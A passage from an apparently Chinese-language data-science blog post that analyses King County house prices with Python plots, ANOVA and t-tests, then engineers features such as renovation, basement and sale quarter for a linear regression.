class="string">&quot;Medina&quot;</span>, <span class="string">&quot;Bellevue&quot;</span>, <span class="string">&quot;Mercer Island&quot;</span>, </span><br><span class="line">               <span class="string">&quot;Madison Park&quot;</span>, <span class="string">&quot;Capitol Hill&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#plotting the data</span></span><br><span class="line">plt.subplots(figsize=(<span class="number">8</span>,<span class="number">4</span>))</span><br><span class="line">sns.barplot(x=kc_top5_price.index, y=kc_top5_price, order=kc_top5_price.index, palette=<span class="string">&quot;Blues_d&quot;</span>) <span class="comment">#blue for seahawks!</span></span><br><span class="line">plt.xticks(np.arange(<span class="number">5</span>), area_labels, rotation=<span class="number">75</span>, size=<span class="number">8</span>) <span class="comment">#relabel x with list above</span></span><br><span class="line">plt.hlines(kc_mean_price, -<span class="number">.5</span> ,<span class="number">4.5</span>, colors=<span class="string">&quot;darkgoldenrod&quot;</span>, label=<span class="string">&quot;Average Price&quot;</span>) <span class="comment">#plot average price horizontal line</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#prettify graph</span></span><br><span class="line">plt.xlabel(<span class="string">&quot;Neighborhoods&quot;</span>, size=<span class="number">14</span>)</span><br><span class="line">plt.ylabel(<span class="string">&quot;Prices ($1mil)&quot;</span>, size=<span class="number">14</span>)</span><br><span class="line">plt.title(<span class="string">&quot;Neighborhoods with Highest Property Price&quot;</span>, size=<span class="number">16</span>, y=<span class="number">1.08</span>)</span><br><span class="line">plt.legend() <span class="comment">#show legend</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#uncomment line below to export image</span></span><br><span class="line"><span class="comment"># plt.savefig(&quot;images/high_price_neighborhood.png&quot;,bbox_inches = &quot;tight&quot;)</span></span><br><span class="line">plt.show();</span><br></pre></td></tr></table></figure>
<p>房价最高的街区<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042345967.png" alt="image.png"></p>
<p>接着，通过热力型地图，将每个地区平均房价以热力值的形式，直观地表现在地图上，颜色越深代表平均房价越高，以下是具体实现代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#shapefile data setup</span></span><br><span class="line">king_county = gpd.read_file(<span class="string">&quot;data/zipcode_shape/Zipcodes_for_King_County_and_Surrounding_Area___zipcode_area.shp&quot;</span>)</span><br><span class="line">king_county[<span class="string">&quot;zipcode&quot;</span>] = king_county[<span class="string">&quot;ZIP&quot;</span>] <span class="comment">#set up column for merge</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#kc_df price setup</span></span><br><span class="line">zip_price = kc_df.groupby(<span class="string">&quot;zipcode&quot;</span>).price.mean()</span><br><span class="line"></span><br><span class="line"><span class="comment">#plotting data setup</span></span><br><span class="line">zip_plot_df = king_county.join(zip_price, on=<span class="string">&quot;zipcode&quot;</span>, how=<span class="string">&quot;inner&quot;</span>)</span><br><span class="line"><span class="comment">#plot setup</span></span><br><span class="line">fig, ax = plt.subplots(figsize=(<span class="number">12</span>,<span class="number">6</span>))</span><br><span class="line">zip_plot_df.plot(column=<span class="string">&quot;price&quot;</span>, cmap=<span class="string">&quot;YlOrRd&quot;</span>, linewidth=<span class="number">.25</span>, edgecolor=<span class="string">&quot;.25&quot;</span>, ax=ax)</span><br><span class="line"></span><br><span class="line"><span class="comment">#set up colorbar</span></span><br><span class="line">color_bar = plt.cm.ScalarMappable(cmap=<span class="string">&quot;YlOrRd&quot;</span>, norm=plt.Normalize(vmin=zip_price.<span class="built_in">min</span>(), vmax=zip_price.<span class="built_in">max</span>()))</span><br><span class="line">color_bar._A = []</span><br><span class="line">cbar = fig.colorbar(color_bar, fraction=<span class="number">0.03</span>, pad=<span class="number">0.02</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#set figure limit to zoom in on select neighborhoods</span></span><br><span class="line">ax.set_ylim(<span class="number">47.45</span>, <span class="number">47.7</span>)</span><br><span class="line">ax.set_xlim(-<span class="number">122.35</span>, -<span class="number">122.15</span>)</span><br><span class="line">ax.set_xticks([-<span class="number">122.35</span>, -<span class="number">122.15</span>])</span><br><span class="line">ax.set_ylabel(<span class="string">&quot;Latitude&quot;</span>, size=<span class="number">12</span>)</span><br><span class="line">ax.set_xlabel(<span class="string">&quot;Longitude&quot;</span>, size=<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#labeling few areas</span></span><br><span class="line">ax.text(-<span class="number">122.257</span>, <span class="number">47.62</span>, <span class="string">&#x27;Medina&#x27;</span>)</span><br><span class="line">ax.text(-<span class="number">122.2</span>, <span class="number">47.57</span>, <span class="string">&#x27;Bellevue&#x27;</span>, rotation=-<span class="number">45</span>)</span><br><span class="line">ax.text(-<span class="number">122.26</span>, <span class="number">47.58</span>, <span class="string">&#x27;Mercer Island&#x27;</span>)</span><br><span class="line"></span><br><span class="line">plt.title(<span class="string">&quot;Average Price per Zipcode Heatmap&quot;</span>, size=<span class="number">14</span>)</span><br><span class="line"><span class="comment">#uncomment below to save image</span></span><br><span class="line"><span class="comment"># plt.savefig(&quot;images/zipcode_price_heatmap.png&quot;,bbox_inches = &quot;tight&quot;)</span></span><br><span class="line">plt.show();</span><br></pre></td></tr></table></figure>
<p>平均房价的热力型地图：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042345968.png" alt="image.png"></p>
<p>通过分析每个地区（不同邮政编码）的平均房地产价值，Medina、Belleve、Mercer Island、Madison Park和Capitol Hill地区成为平均房地产价格最高的地区。这些社区的大多数房产是金县平均房产价值的两倍，麦地那的平均房产价值是金县的四倍。似乎是由于靠近华盛顿湖和大型公园，这些房产的价值越来越高。</p>
<p><strong>使用前5个街区的对房地产价格进行方差分析</strong><br>对比前五个排名的邮政编码与平均房价之间的关系，通过ANOVA检验判断是否存在统计上的显著差异，并进行相应的输出。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">alpha = <span class="number">0.05</span></span><br><span class="line"><span class="comment">#ANOVA Test Setup</span></span><br><span class="line">kc_top5 = kc_df[kc_df.zipcode.isin(kc_top5_price.index)]</span><br><span class="line">formula = <span class="string">&#x27;price~C(zipcode)&#x27;</span></span><br><span class="line">lm_top5 = smf.ols(formula, kc_top5).fit()</span><br><span class="line">anova_top5_table = sm.stats.anova_lm(lm_top5, typ=<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> anova_top5_table[<span class="string">&quot;PR(&gt;F)&quot;</span>][<span class="number">0</span>] &lt; alpha:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Top 5 ranked zipcode have a statistically significant impact on average property value&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Zipcdoe ANOVA F-statisic Probability: &quot;</span>, anova_top5_table[<span class="string">&quot;PR(&gt;F)&quot;</span>][<span class="number">0</span>])</span><br></pre></td></tr></table></figure>
<p>输出：<br><code>Top 5 ranked zipcode have a statistically significant impact on average property value Zipcdoe ANOVA F-statisic Probability: 1.2515560223110402e-19</code></p>
<h4 id="2-4分析房产状况是否会影响价值？"><a href="#2-4分析房产状况是否会影响价值？" class="headerlink" title="2.4分析房产状况是否会影响价值？"></a>2.4分析房产状况是否会影响价值？</h4><p>通过以下代码可视化不同房屋条件评分下的平均房价和中位数房价，并对比平均房价和中位数房价之间的差异。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-------------------Conditions Calculation--------------------------------#</span></span><br><span class="line">condition_mean = kc_df.groupby(<span class="string">&quot;condition&quot;</span>)[<span class="string">&quot;price&quot;</span>].mean()</span><br><span class="line">condition_median = kc_df.groupby(<span class="string">&quot;condition&quot;</span>)[<span class="string">&quot;price&quot;</span>].median()</span><br><span class="line">condition_score = np.arange(<span class="number">1</span>,<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Bar Plots--------------------------------------#</span></span><br><span class="line"><span class="comment">#set subplot data</span></span><br><span class="line">fig, ax = plt.subplots(figsize=(<span class="number">8</span>,<span class="number">4</span>))</span><br><span class="line">ax2 = ax.twinx() <span class="comment">#set ax2 on same x axis as ax</span></span><br><span class="line">ax3 = ax.twinx() <span class="comment">#same as above, for hline</span></span><br><span class="line">width = <span class="number">0.5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#barplots </span></span><br><span class="line">ax.bar(x=condition_score, height=condition_median, width=width,</span><br><span class="line">       label=<span class="string">&quot;Median Price&quot;</span>, color=<span class="string">&quot;midnightblue&quot;</span>, alpha=<span class="number">0.8</span>)</span><br><span class="line">ax2.bar(x=condition_score, height=condition_mean, width=width,</span><br><span class="line">        label=<span class="string">&quot;Mean Price&quot;</span>, color=<span class="string">&quot;royalblue&quot;</span>, alpha=<span class="number">0.8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#horizontal line for mean price</span></span><br><span class="line">ax3.hlines(kc_mean_price, <span class="number">.7</span> ,<span class="number">5.3</span>, colors=<span class="string">&quot;red&quot;</span>, label=<span class="string">&quot;Average Price&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#set ylimit to the same scale and display only 1</span></span><br><span class="line">ax.set_ylim(<span class="number">0</span>,<span class="number">1.2</span>*condition_mean.<span class="built_in">max</span>())</span><br><span class="line">ax2.set_ylim(<span class="number">0</span>,<span class="number">1.2</span>*condition_mean.<span class="built_in">max</span>())</span><br><span class="line">ax3.set_ylim(<span class="number">0</span>,<span class="number">1.2</span>*condition_mean.<span class="built_in">max</span>())</span><br><span class="line">ax2.yaxis.set_visible(<span class="literal">False</span>) <span class="comment">#hide the 2nd axis</span></span><br><span class="line">ax3.yaxis.set_visible(<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#set legend positions</span></span><br><span class="line">ax.legend(bbox_to_anchor=(<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>), loc=<span class="string">&quot;upper left&quot;</span>)</span><br><span class="line">ax2.legend(bbox_to_anchor=(<span class="number">0</span>,-<span class="number">.1</span>,<span class="number">1</span>,<span class="number">1</span>), loc=<span class="string">&quot;upper left&quot;</span>)</span><br><span class="line">ax3.legend(bbox_to_anchor=(<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>), loc=<span class="string">&quot;upper right&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#prettify graph</span></span><br><span class="line">ax.set_ylabel(<span class="string">&quot;Average Prices ($)&quot;</span>, size=<span class="number">14</span>)</span><br><span class="line">ax.set_xlabel(<span class="string">&quot;Condition Score&quot;</span>, size=<span class="number">14</span>)</span><br><span class="line">plt.title(<span class="string">&quot;Average Property Value per Condition&quot;</span>, size=<span class="number">16</span>, y=<span class="number">1.08</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#uncomment line below to export image</span></span><br><span class="line"><span class="comment"># plt.savefig(&quot;images/condition_value.png&quot;,bbox_inches = &quot;tight&quot;)</span></span><br><span class="line">plt.legend()</span><br><span class="line">plt.show();</span><br></pre></td></tr></table></figure>
<p>输出图片如下：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042345969.png" alt="image.png"></p>
<p><strong>物业条件统计分析</strong><br>𝛼  &#x3D; 0.05<br>Null-Hypothesis：不同条件下的平均财产价值没有显著差异。<br>Alternative Hypothesis：不同条件下的平均财产价值有显著差异。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">alpha = <span class="number">0.05</span> </span><br><span class="line"><span class="comment">#ANOVA Test Setup</span></span><br><span class="line">formula = <span class="string">&#x27;price~C(condition)&#x27;</span></span><br><span class="line">lm_condition = smf.ols(formula, kc_df).fit()</span><br><span class="line">anova_condition = sm.stats.anova_lm(lm_condition, typ=<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> anova_condition[<span class="string">&quot;PR(&gt;F)&quot;</span>][<span class="number">0</span>] &lt; alpha:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;The property condition have a statistically significant impact on average property value&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Conditions F-statisic Probability: &quot;</span>, anova_condition[<span class="string">&quot;PR(&gt;F)&quot;</span>][<span class="number">0</span>])</span><br></pre></td></tr></table></figure>
<p>输出如下：<code>The property condition have a statistically significant impact on average property value Conditions F-statisic Probability: 6.813536869407728e-24</code></p>
<p><strong>结论：</strong><br>房产条件对房地产的价格有重大影响。随着情况的恶化，平均房价和中值房价都呈上升趋势。</p>
<h4 id="2-5房产的特点和升级（哪些功能为房子增值）"><a href="#2-5房产的特点和升级（哪些功能为房子增值）" class="headerlink" title="2.5房产的特点和升级（哪些功能为房子增值）"></a>2.5房产的特点和升级（哪些功能为房子增值）</h4><p>本部分将对有&#x3D;&#x3D;地下室的房子会为房产增值吗？&#x3D;&#x3D;以及&#x3D;&#x3D;翻新是否会增加房产的价值？&#x3D;&#x3D;两个问题进行分析。<br>通过将数据集分类成[有地下室，无地下室]以及[翻新、未翻新]继续平均房价的柱状图绘制，来直观得出上述问题的答案。<br>以下是具体实现代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#--------------------------Property Feature Calculation---------------------------------------#</span></span><br><span class="line">basement = kc_df[(kc_df[<span class="string">&quot;sqft_basement&quot;</span>] &gt; <span class="number">0</span>)]</span><br><span class="line">basement_mean = basement.price.mean()</span><br><span class="line">no_basement = kc_df[(kc_df[<span class="string">&quot;sqft_basement&quot;</span>] == <span class="number">0</span>)]</span><br><span class="line">no_basement_mean = no_basement.price.mean()</span><br><span class="line"></span><br><span class="line"><span class="comment">#mean values to plot</span></span><br><span class="line">renovated = kc_df[(kc_df[<span class="string">&quot;yr_renovated&quot;</span>] &gt; <span class="number">0</span>)]</span><br><span class="line">renovated_mean = renovated.price.mean()</span><br><span class="line">not_renovated = kc_df[(kc_df[<span class="string">&quot;yr_renovated&quot;</span>] == <span class="number">0</span>)]</span><br><span class="line">not_renovated_mean = not_renovated.price.mean()</span><br><span class="line"></span><br><span class="line"><span class="comment">#prepare plot labels</span></span><br><span class="line">label_basement = [<span class="string">&quot;Basement&quot;</span>, <span class="string">&quot;No basement&quot;</span>]</span><br><span class="line">values_basement = [basement_mean, no_basement_mean]</span><br><span class="line">label_renovation = [<span class="string">&quot;Renovated&quot;</span>, <span class="string">&quot;No Renovation&quot;</span>]</span><br><span class="line">values_renovation = [renovated_mean, not_renovated_mean]</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Bar Plots--------------------------------------#</span></span><br><span class="line">fig, ax = plt.subplots(<span class="number">1</span>, <span class="number">2</span>, figsize=(<span class="number">14</span>,<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">sns.barplot(ax=ax[<span class="number">0</span>], x=label_basement, y=values_basement, palette=<span class="string">&quot;Blues_r&quot;</span>)</span><br><span class="line">sns.barplot(ax=ax[<span class="number">1</span>], x=label_renovation, y=values_renovation, palette=<span class="string">&quot;Blues_r&quot;</span>)</span><br><span class="line">ax[<span class="number">0</span>].hlines(kc_mean_price, -<span class="number">.5</span> ,<span class="number">1.5</span>, colors=<span class="string">&quot;coral&quot;</span>, label=<span class="string">&quot;Average Price&quot;</span>) <span class="comment">#plot average price horizontal line</span></span><br><span class="line">ax[<span class="number">1</span>].hlines(kc_mean_price, -<span class="number">.5</span> ,<span class="number">1.5</span>, colors=<span class="string">&quot;coral&quot;</span>, label=<span class="string">&quot;Average Price&quot;</span>) <span class="comment">#plot average price horizontal line</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#prettify graph</span></span><br><span class="line">ax[<span class="number">0</span>].set_ylabel(<span class="string">&quot;Average Prices ($)&quot;</span>, size=<span class="number">12</span>)</span><br><span class="line">ax[<span class="number">0</span>].set_title(<span class="string">&quot;Average Property Value&quot;</span>, size=<span class="number">14</span>)</span><br><span class="line">ax[<span class="number">0</span>].set_ylim(<span class="number">0</span>,<span class="number">1.1</span>*renovated_mean)</span><br><span class="line">ax[<span class="number">0</span>].legend()</span><br><span class="line"></span><br><span class="line">ax[<span class="number">1</span>].set_ylabel(<span class="string">&quot;Average Prices ($)&quot;</span>, size=<span class="number">12</span>)</span><br><span class="line">ax[<span class="number">1</span>].set_title(<span class="string">&quot;Average Property Value&quot;</span>, size=<span class="number">14</span>)</span><br><span class="line">ax[<span class="number">1</span>].set_ylim(<span class="number">0</span>,<span class="number">1.1</span>*renovated_mean)</span><br><span class="line">ax[<span class="number">1</span>].legend()</span><br><span class="line"></span><br><span class="line">plt.suptitle(<span class="string">&quot;Affect of Basement and Renovation on Property Value&quot;</span>, size=<span class="number">16</span>, y=<span class="number">1.02</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#uncomment below to export image</span></span><br><span class="line"><span class="comment"># plt.savefig(&quot;images/basement_renovation_value.png&quot;,bbox_inches = &quot;tight&quot;)</span></span><br><span class="line">plt.show();</span><br></pre></td></tr></table></figure>
<p>结果图：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042345970.png" alt="image.png"></p>
<p><strong>房产特征统计分析</strong><br>$\alpha$&#x3D;0.05<br><strong>地下室</strong><br>Null-Hypothesis：有地下室和没有地下室的房产之间的平均房产价值没有显著差异<br>Alternative Hypothesis：有或没有地下室的房产的平均房产价值有显著差异。</p>
<p><strong>翻新</strong><br>Null-Hypothesis：翻新或未翻新的房产的平均房产价值没有显著差异。<br>Alternative Hypothesis：翻新或未翻新的房产之间的平均房产价值有显著差异。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">alpha = <span class="number">0.05</span></span><br><span class="line">basement_p_val = stats.ttest_ind(basement.price, no_basement.price, equal_var=<span class="literal">False</span>)[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Basement vs No Basement T-test P Value: &quot;</span>, basement_p_val)</span><br><span class="line"><span class="keyword">if</span> basement_p_val &lt; alpha:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;The P value is less than alpha, reject null-hypothesis&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>) <span class="comment">#white space for formatting output</span></span><br><span class="line"></span><br><span class="line">renovation_p_val = stats.ttest_ind(renovated.price, not_renovated.price, equal_var=<span class="literal">False</span>)[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Renovated vs Not Renovated T-test P Value: &quot;</span>, renovation_p_val)</span><br><span class="line"><span class="keyword">if</span> renovation_p_val &lt; alpha:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;The P value is less than alpha, reject null-hypothesis&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>输出如下：<br><code>Basement vs No Basement T-test P Value: 1.935598808013724e-102 The P value is less than alpha, reject null-hypothesis Renovated vs Not Renovated T-test P Value: 6.478917377975333e-20 The P value is less than alpha, reject null-hypothesis</code></p>
<p><strong>结论：</strong><br>地下室和翻新都为房产增加了显著的价值，翻新对房产价值的平均影响更大。</p>
<h4 id="2-6探索性数据分析总结"><a href="#2-6探索性数据分析总结" class="headerlink" title="2.6探索性数据分析总结"></a>2.6探索性数据分析总结</h4><ol>
<li>哪个街区拥有最有价值的房产？<br>-金县的麦地那、贝尔韦、默瑟岛、麦迪逊公园和国会山社区的平均房地产价值最高。这些地区的房地产价值与金县的平均房地产价值在统计上存在显著差异。</li>
<li>房产状况是否会影响价值？<br>-房地产条件对房地产价值有统计学上的显著影响。然而，条件4&#x2F;5的平均值小于条件3&#x2F;5的平均值。这可能是由于其他因素造成的，如公寓&#x2F;合作公寓，其每栋房产的价格可能较低，但往往比私人住宅维护得更好。</li>
<li>哪些功能为房子增值？<br>-翻新后的房产比未翻新的房产具有更高的价值。<br>-基准面为特性添加了重要的值。</li>
</ol>
<h3 id="3-特征工程（Feature-Engineering）"><a href="#3-特征工程（Feature-Engineering）" class="headerlink" title="3.特征工程（Feature Engineering）"></a>3.特征工程（Feature Engineering）</h3><p>Feature Engineering（特征工程）是指在机器学习中对原始数据中的属性进行提取、转换、选择和创建新特征的过程。它是机器学习中至关重要的一步，可以显著影响模型的性能和准确度。</p>
<p>在特征工程中，我们通过对原始数据进行处理和转换，提取出更具信息量和表达能力的特征，以便更好地描述数据的特性和模式。这可以通过以下几种方式实现：</p>
<ol>
<li><p><strong>特征提取（Feature Extraction）</strong>：从原始数据中提取有用的特征。例如，从文本数据中提取词袋模型、TF-IDF值或词嵌入向量作为特征；从图像数据中提取边缘、纹理或颜色直方图作为特征。</p>
</li>
<li><p><strong>特征转换（Feature Transformation）</strong>：对原始特征进行转换或降维。例如，通过主成分分析（PCA）将高维数据转换为低维表示；使用多项式特征转换将原始特征转化为更高阶的多项式特征。</p>
</li>
<li><p><strong>特征选择（Feature Selection）</strong>：选择对目标变量预测有重要影响的特征，剔除对模型无关的特征。这可以通过统计方法（如方差阈值、相关系数等）或基于模型的方法（如L1正则化、决策树特征重要性等）来实现。</p>
</li>
<li><p><strong>特征创造（Feature Creation）</strong>：通过组合、衍生或生成新的特征来增强原始特征的表达能力。例如，将时间数据分解为年、月、日等组成部分；通过数值间的计算（如差值、比值）来创建新的特征。</p>
</li>
</ol>
<p>通过精心进行特征工程，可以使模型更好地捕捉数据中的模式和规律，提高模型的准确性、鲁棒性和泛化能力。因此，特征工程是机器学习中非常重要和常用的技术之一。</p>
<h4 id="功能检查"><a href="#功能检查" class="headerlink" title="功能检查"></a>功能检查</h4><p>在进行工程设计之前，所有功能都应该是浮点或整数。在添加到Sklearn线性回归训练之前，日期、id和价格列将被删除。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kc_df.head()</span><br></pre></td></tr></table></figure>
<p>输出结果：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042345971.png" alt="image.png"></p>
<h4 id="翻新"><a href="#翻新" class="headerlink" title="翻新"></a>翻新</h4><p>由于翻新对物业价值有重大影响，因此可以将此功能更新为分类功能</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kc_df[<span class="string">&quot;renovated&quot;</span>] = kc_df.yr_renovated.apply(<span class="keyword">lambda</span> x: <span class="number">1</span> <span class="keyword">if</span> x &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h4 id="翻新年限"><a href="#翻新年限" class="headerlink" title="翻新年限"></a>翻新年限</h4><p>翻新价值可能会随着年限而贬值，因此此功能可能会提供负相关功能</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kc_df[<span class="string">&quot;renovation_age&quot;</span>] = kc_df.yr_renovated.apply(<span class="keyword">lambda</span> x: <span class="number">2020</span>-x <span class="keyword">if</span> x &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h4 id="地下室"><a href="#地下室" class="headerlink" title="地下室"></a>地下室</h4><p>创建”Basement”特征与进行装修类似。由于拥有地下室可以自动增加房产的价值，因此将其作为二元分类特征可以更好地引导模型。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kc_df[<span class="string">&quot;basement&quot;</span>] = kc_df.sqft_basement.apply(<span class="keyword">lambda</span> x: <span class="number">1</span> <span class="keyword">if</span> x != <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h4 id="主浴室"><a href="#主浴室" class="headerlink" title="主浴室"></a>主浴室</h4><p>拥有2个或更多浴室的房产很可能包含一个主卫生间，而对许多买家来说，主卫生间是非常理想的。虽然拥有2个浴室并不保证房产有一个主卫生间，但鉴于浴室与房价高度相关且与其他特征存在多重共线性，它可能是进行特征工程的一个好的候选。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kc_df[<span class="string">&quot;master_bathroom&quot;</span>] = kc_df.bathrooms.apply(<span class="keyword">lambda</span> x: <span class="number">1</span> <span class="keyword">if</span> x &gt; <span class="number">2</span> <span class="keyword">else</span> <span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h4 id="家庭住宅"><a href="#家庭住宅" class="headerlink" title="家庭住宅"></a>家庭住宅</h4><p>“Family House”特征的创建与上面的”Master Bathroom”特征类似，旨在引导模型将房产区分为公寓和独立房屋。这并不是一个完美的实现，但它是一个简单的方式来区分小型公寓，例如工作室式公寓。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kc_df[<span class="string">&quot;family_house&quot;</span>] = kc_df.bedrooms.apply(<span class="keyword">lambda</span> x: <span class="number">1</span> <span class="keyword">if</span> x &gt; <span class="number">2</span> <span class="keyword">else</span> <span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h4 id="销售年份和销售季度"><a href="#销售年份和销售季度" class="headerlink" title="销售年份和销售季度"></a>销售年份和销售季度</h4><p>“Sold Year”和”Sold Quarter”特征的创建是基于原始日期列的处理。由于日期列的数据类型为字符串，为了将其处理为整数类型，将其拆分为年份和年度季度。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kc_df[<span class="string">&quot;sale_year&quot;</span>] = kc_df.date.apply(<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x[:<span class="number">4</span>])) <span class="comment">#convert first 4 character, year, into int</span></span><br><span class="line">kc_df[<span class="string">&quot;sale_quarter&quot;</span>] = kc_df.date.apply(<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x[<span class="number">4</span>:<span class="number">6</span>])//<span class="number">3.1</span> + <span class="number">1</span>) <span class="comment">#fancy math convert month, 4-5 index, to quarters in int</span></span><br></pre></td></tr></table></figure>

